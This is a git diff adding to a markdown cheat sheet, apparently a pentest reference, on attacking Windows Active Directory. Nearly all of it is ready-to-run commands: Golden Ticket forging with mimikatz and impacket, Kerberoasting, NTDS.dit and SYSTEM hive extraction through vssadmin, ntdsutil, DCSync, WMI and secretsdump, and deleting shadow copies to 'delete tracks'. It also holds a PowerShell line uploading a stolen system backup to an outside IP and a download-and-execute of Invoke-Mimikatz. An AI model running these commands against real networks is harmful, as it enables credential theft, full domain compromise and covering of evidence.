@@ -6,7 +6,13 @@ With krbtgt, We can create a Golden ticket.
 
 - [LSA Dump](https://github.com/gentilkiwi/mimikatz/wiki/module-~-lsadump)
 
+```
+# Initial location of the NTDS database on the domain controller
+C:\Windows\NTDS\NTDS.dit
 
+# Step 1 → Finding a way to get the NDTS.dis and SYSTEM file
+# Step 2 → Crack/Analyze offline
+```
 ### Golden Ticket Attack
 
 ```
@@ -86,4 +92,249 @@ powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.
 
 
 powershell.exe -c "(New-Object System.Net.WebClient).UploadFile('http://192.168.45.164:8000/', 'C:\system.bak')"
+```
+
+
+
+
+### Ticket generation from Linux
+
+```
+# Generate a ticket or convert it (kekeo) to ccache format
+ticketer.py -nthash <hash> -domain-sid <sid> -domain <domain> <user>
+
+# Export the path in the right variable
+export KRB5CCNAME=/tmp/ticket.ccache
+klist
+
+# Exec and use the ticket
+/impacket/examples/psexec.py -k -n -debug DOMAIN/user@host
+
+# Dump NTDS
+proxychains secretsdump.py -k -no-pass qsec@DCFIL.PRAMAFIL.CORP -use-vss
+
+```
+
+### Golden Ticket
+
+```
+# Golden Ticket
+> Nom du compte administrateur (Administrateur)
+> Nom complet du domaine (domain.local)
+> SID du domaine (S-1-5-21-1723555596-1415287819-2705645101) [whoami /user]
+> Hash NTLM du compte krbtgt (6194bd1a5bf3ecd542e8aac9860bddf0)
+
+mimikatz # privilege:debug
+mimikatz # lsadump::lsa /inject /name:krbtgt
+
+mimikatz # kerberos::golden /admin:Administrateur /domain:domain.local /sid:S-1-5-21-1723555596-1415287819-2705645101 /krbtgt:6194bd1a5bf3ecd542e8aac9860bddf0 /ticket:domain.local.kirbi /id:500 /ptt
+
+Use :
+mimikatz # kerberos::ptt domain.local.kirbi
+mimikatz # kerberos::list
+
+
+
+# Resource
+https://twitter.com/mpgn_x64/status/1241688547037532161
+
+# Golden ticket and access denied ?
+# from cmd (elevated)
+> mimikatz kerberos::golden
+> klist add_bind <DOMAIN> <DC>
+> psexec \\dc\ cmd
+
+
+```
+
+### Playing with tickets on Windows
+
+```
+# Sessions en cours
+mimikatz # sekurlsa::logonpasswords
+
+# Ticket TGT
+# Dump SPN
+PS C:\> Find-PSServiceAccounts -DumpSPN
+Discovering service account SPNs in the AD Domain foo.local
+svcSQLServ/pc1.foo.local:1433
+
+# Download Mimikatz
+PS C:\> Invoke-Expression (New-Object Net.Webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
+PS C:\> Invoke-Mimikatz
+mimikatz(powershell) # sekurlsa::logonpasswords
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+
+# Lister les tickets actifs ou les purger
+PS C:\> Invoke-Mimikatz -Command '"kerberos::purge"'
+PS C:\> Invoke-Mimikatz -Command '"kerberos::list"'
+PS C:\> klist
+
+# Demander un ticket
+PS C:\> Add-Type -AssemblyName System.IdentityModel
+PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "svcSQLServ/pc1.foo.local:1433"
+
+# Exporter un ticket
+mimikatz # kerberos::list /export
+
+# Crack Ticket
+python tgsrepcrack.py wordlist.txt ticket.kirbi
+
+```
+
+### Local Extraction
+##### VSSadmin
+
+```
+# Récupération via VSSadmin
+# Create a Volume Shadow Copy
+C:\Windows\system32> vssadmin create shadow /for=C:
+
+# Retrieve NTDS from the copy
+C:\Windows\system32> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit c:\Extract\ntds.dit
+
+# Copy SYSTEM file
+C:\Windows\system32> reg SAVE HKLM\SYSTEM c:\Extract\SYS
+C:\Windows\system32> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM c:\Extract\SYSTEM
+
+# Delete tracks
+C:\Windows\system32> vssadmin delete shadows /shadow={uuid}
+
+# Trick if you are on a semi-interactive shell
+# You can specify /quiet option to not get the prompt
+# Can be usefull for deletion (as it require to confirm)
+vssadmin delete shadows /shadow={uuid} /quiet
+
+```
+
+##### ntdsutil tool
+
+```
+# ntdsutil is a builtin tool used to manage the AD
+# You can abuse it and create a backup of the ntds.dit file
+ntdsutil
+activate instance ntds
+ifm
+create full C:\ntdsutil
+quit
+quit
+
+```
+
+##### DC Sync / Mimikatz
+
+```
+# DC Sync is a less noisy way to extract users informations
+# It uses the DRS (Directory Replication Service)
+
+# Classic
+mimikatz # lsadump::dcsync /domain:domain.lan /all /csv
+
+# Specific user
+mimikatz # lsadump::dcsync /domain:domain.lan /user:test
+
+```
+
+##### PowerSploit
+
+```
+# PowerSploit contains a script using the volume shadow copy service
+Import-Module .\VolumeShadowCopyTools.ps1
+New-VolumeShadowCopy -Volume C:\
+Get-VolumeShadowCopy 
+
+# Also possible through a meterpreter session
+powershell_shell
+New-VolumeShadowCopy -Volume C:\
+Get-VOlumeShadowCopy
+
+```
+
+##### Invoke-DCSync
+
+```
+# Powershell script
+# Leverages PowerView, Invoke-ReflectivePEInjection and a DLL wrapper of PowerKatz
+Invoke-DCSync
+
+# Get other format (user:id:lm:ntlm)
+Invoke-DCSync -PWDumpFormat
+
+# It is also possible through a meterpreter session
+
+```
+
+##### Nishang
+
+```
+# Nishang is a post exploitation framework allowing attacker to perform attacks
+# You can use the Copy-VSS script to get NTDS.dit, SAM and SYSTEM files
+Import-Module .\Copy-VSS.ps1
+Copy-VSS
+Copy-VSS -DestinationDir C:\ShadowCopy\
+
+# You can also use them throught a meterpretrer session by loading the powershell extension
+load powershell
+powershell_import /root/Copy-VSS.ps1
+powershell_execute Copy-VSS
+
+# Also possible to establish a direct connection
+powershell_shell
+PS > Copy-VSS
+PS > Copy-VSS -DestinationDir C:\Ninja
+
+```
+
+### Remote Extraction
+
+##### CrackMapExec
+```
+crackmapexec xxx.xxx.xxx.xxx -u login -p password -d domain --ntds drsuapi
+```
+##### WMI - Remote
+
+```
+# It is possible to remotely extract the NTDS database using WMI and VSSADMIN
+wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c vssadmin create shadow /for=C: 2>&1"
+wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\ntds.dit 2>&1"
+wmic /node:dc /user:PENTESTLAB\David /password:pentestlab123!! process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM\ C:\temp\SYSTEM.hive 2>&1"
+
+```
+
+#### Impacket
+
+```
+
+python secretsdump.py -history -user-status -just-dc-user Administrateur -just-dc-ntlm foo.local/administrateur:P4ssw0rd\!@DC1.FOO.LOCAL
+
+python secretsdump.py -history -user-status -just-dc-user krbtgt -just-dc-ntlm foo.local/administrateur:P4ssw0rd\!@DC1.FOO.LOCAL
+
+
+
+```
+
+##### NTDS Extraction and analysis
+
+```
+# Impacket provides a usefull script to do that (decrypt copied files)
+impacket-secretsdump -system /root/SYSTEM -ntds /root/ntds.dit DOMAIN
+
+# Also possible to dump it remotely by using the computer account and its hash
+impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49aab58dd8fb314e268c4c6a65dfc9 -just-dc PENTESTLAB/dc\$@10.0.0.1
+
+# Extraction is also possible using NTDSDumpEx
+NTDSDumpEx.exe -d ntds.dit -s SYSTEM.hive
+
+# Or adXtract
+./adXtract.sh /root/ntds.dit /root/SYSTEM pentestlab
+
+```
+
+##### Empire
+
+```
+# Empire has 2 modules you can use to retrieve hashes through DCSync
+usemodule credentials/mimikatz/dcsync_hashdump
+usemodule credentials/mimikatz/dcsync
+
 ```
